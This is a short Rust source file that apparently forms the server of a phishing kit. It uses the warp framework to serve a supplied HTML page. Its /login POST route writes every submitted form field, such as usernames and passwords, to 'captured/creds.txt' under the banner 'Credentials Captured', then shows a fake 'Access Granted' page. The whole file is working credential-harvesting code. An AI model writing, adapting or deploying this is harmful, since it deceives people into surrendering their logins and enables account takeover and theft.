use warp::Filter;
use std::fs::{OpenOptions};
use std::io::Write;

pub async fn start_server(html: String) {
    let html_clone = html.clone();

    let site = warp::path::end().map(move || warp::reply::html(html_clone.clone()));
    let creds = warp::post()
        .and(warp::path("login"))
        .and(warp::body::form())
        .map(|form: std::collections::HashMap<String, String>| {
            let mut file = OpenOptions::new()
                .create(true)
                .append(true)
                .open("captured/creds.txt")
                .unwrap();

            writeln!(file, "🎯 Credentials Captured:").unwrap();
            for (key, value) in form.iter() {
                writeln!(file, "{}: {}", key, value).unwrap();
            }
            writeln!(file, "-----------------------------\n").unwrap();

            warp::reply::html("<h1>✅ Access Granted</h1>")
        });

    let routes = site.or(creds);
    warp::serve(routes).run(([0, 0, 0, 0], 8080)).await;
}
